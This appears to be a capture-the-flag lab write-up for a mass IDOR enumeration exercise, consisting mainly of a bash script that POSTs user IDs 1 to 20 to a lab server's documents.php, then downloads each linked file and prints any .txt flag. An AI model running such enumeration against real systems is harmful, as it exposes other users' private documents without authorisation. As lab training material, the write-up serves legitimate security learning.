# [Mass IDOR Enumeration](Mass%20IDOR%20Enumeration.md)
### Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

**Script that i used**
```bash
url="http://154.57.164.81:31072"
echo "=== Mass IDOR Enumeration with POST ==="
for i in {1..20}; do
    echo "Checking uid $i"
    
    # Use POST method with uid parameter
    for link in $(curl -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents\/[^']*\.(pdf|txt)"); do
        echo "  Found: $link"
        
        # Download the file
        wget -q "$url$link"
        
        # If it's a .txt file, display content immediately
        filename=$(basename "$link")
        if [[ "$filename" == *.txt ]]; then
            echo "  *** FLAG FOUND: $filename ***"
            echo "  Content:"
            cat "$filename"
            echo "=========================="
        fi
    done
done
echo "=== Enumeration completed ==="
```
![](Screenshot%202026-07-20%20at%2021.29.00.png)
